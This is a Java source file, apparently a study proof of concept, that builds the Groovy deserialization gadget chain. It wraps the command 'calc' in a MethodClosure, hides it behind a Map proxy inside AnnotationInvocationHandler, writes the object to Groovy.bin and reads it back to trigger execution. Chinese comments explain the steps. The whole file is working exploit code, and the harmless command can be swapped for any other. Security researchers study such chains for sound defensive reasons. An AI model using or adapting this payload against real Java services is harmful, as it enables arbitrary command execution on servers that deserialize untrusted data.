package Groovy;

/**
 * AnnotationInvocationHandler.readObject()
 *     Map.entrySet() (Proxy)
 *         ConversionHandler.invoke()
 *             ConvertedClosure.invokeCustom()
 * 		        MethodClosure.call()
 *                     ProcessGroovyMethods.execute()
 */

import Tools.SerializeUtil;
import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;

import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Map;

public class Groovy {
    public static String fileName = "Groovy.bin";

    public static void main(String[] args) throws Exception {
        //MethodClosure mc = new MethodClosure(Runtime.getRuntime(), "exec");
        //Method m  = MethodClosure.class.getDeclaredMethod("doCall", Object.class);
        //m.setAccessible(true);
        
        //m.invoke(mc, "calc");
        //MethodClosure methodClosure = new MethodClosure("calc", "execute");

        //封装我们需要执行的对象
        MethodClosure methodClosure = new MethodClosure("calc", "execute");
        ConvertedClosure closure = new ConvertedClosure(methodClosure, "entrySet");

        Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = c.getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        // 创建 ConvertedClosure 的动态代理类实例
        Map handler = (Map) Proxy.newProxyInstance(Class.class.getClassLoader(), new Class[]{Map.class}, closure);
        // 使用动态代理初始化 AnnotationInvocationHandler
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, handler);

        SerializeUtil.writeObjectToFile(invocationHandler, fileName);
        SerializeUtil.readFileObject(fileName);
    }
}
